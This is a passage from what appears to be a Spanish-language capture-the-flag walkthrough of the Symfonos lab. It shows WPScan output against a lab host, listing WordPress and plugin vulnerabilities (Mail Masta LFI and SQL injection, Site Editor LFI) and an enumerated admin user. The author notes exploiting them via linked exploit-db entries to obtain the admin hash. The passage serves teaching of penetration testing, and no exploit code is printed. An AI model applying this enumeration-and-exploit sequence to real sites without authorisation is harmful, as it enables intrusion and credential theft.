 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rpwf-hrh2-39jf
 |      - https://pentest.co.uk/labs/research/subtle-stored-xss-wordpress-core/
 |      - https://www.youtube.com/watch?v=tCh7Y8z8fb4
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/741d07d1-2476-430a-b82f-e1228a9343a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4047
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8q2w-5m27-wm27
 |
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/12855f02-432e-4484-af09-7d0fbf596909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4048
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/10e2a50c523cf0b9785555a688d7d36a40fbeccf
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-q6pw-gvf4-5fj5
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/d8addb42-e70b-4439-b828-fd0697e5d9d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4049
 |      - https://www.exploit-db.com/exploits/48770/
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-87h4-phjv-rm6p
 |      - https://hackerone.com/reports/406289
 |
 | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/b6f69ff1-4c11-48d2-b512-c65168988c45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4050
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/dda0ccdd18f6532481406cabede19ae2ed1f575d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4vpv-fgg2-gcqc
 |
 | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/eea6dbf5-e298-44a7-9b0d-f078ad4741f9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25286
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c075eec24f2f3214ab0d0fb0120a23082e6b1122

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:16 <=====================================================================> (92498 / 92498) 100.00% Time: 00:01:16
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.10.10.150/h3l105/wp-content/plugins/akismet/
 | Last Updated: 2021-03-02T18:10:00.000Z
 | Readme: http://10.10.10.150/h3l105/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.150/h3l105/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.1.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.150/h3l105/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.150/h3l105/wp-content/plugins/akismet/readme.txt

[+] mail-masta
 | Location: http://10.10.10.150/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 | Readme: http://10.10.10.150/h3l105/wp-content/plugins/mail-masta/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.150/h3l105/wp-content/plugins/mail-masta/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/5136d5cf-43c7-4d09-bf14-75ff8b77bb44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956
 |      - https://www.exploit-db.com/exploits/40290/
 |      - https://cxsecurity.com/issue/WLB-2016080220
 |
 | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/c992d921-4f5a-403a-9482-3131c69e383a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6570
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6571
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6572
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6573
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6574
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6575
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6576
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6577
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6578
 |      - https://www.exploit-db.com/exploits/41438/
 |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.150/h3l105/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.150/h3l105/wp-content/plugins/mail-masta/readme.txt

[+] site-editor
 | Location: http://10.10.10.150/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 | Readme: http://10.10.10.150/h3l105/wp-content/plugins/site-editor/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.150/h3l105/wp-content/plugins/site-editor/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.150/h3l105/wp-content/plugins/site-editor/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===========================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPVulnDB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 21

```

<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos8.jpg" with=80% />

> El análisis indica dos (02) tipos de Vulnerabilidades: LFI y SQLi. Inclusive WPSCAN nos brinda el enlace de EXPLOIT-DB, está claro que ese es el camino a seguir.

- Explotamos la vulnerabilidad de LFI: https://www.exploit-db.com/exploits/40290

<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos9.jpg" with=80% />

<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos10.jpg" with=80% />

> Exploté rapidamente la inyección de código SQL (https://www.exploit-db.com/exploits/41438/) e identificamos lo siguiente:

<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos11.jpg" with=80% />

- Sólo identifiqué el hash del usuario "admin". 












